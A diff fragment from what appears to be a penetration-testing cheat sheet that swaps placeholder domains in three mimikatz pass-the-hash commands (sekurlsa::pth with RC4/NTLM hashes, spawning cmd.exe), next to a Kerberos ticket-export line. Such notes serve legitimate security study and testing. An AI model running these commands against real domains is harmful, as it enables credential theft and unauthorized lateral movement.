@@ -31,9 +31,9 @@ mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 To perform a pass-the-hash attack using a `rc4` or `NTML` hash:
 
 ```shell!
-mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:xxx.yyy
-mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:xxx.yyy /run:cmd.exe
-mimikatz# sekurlsa::pth /user:xxx /ntlm:XXX /domain:xxx.yyy /run:cmd.exe
+mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:example.com
+mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:example.com /run:cmd.exe
+mimikatz# sekurlsa::pth /user:xxx /ntlm:XXX /domain:example.com /run:cmd.exe
 ```
 </div><div>
 
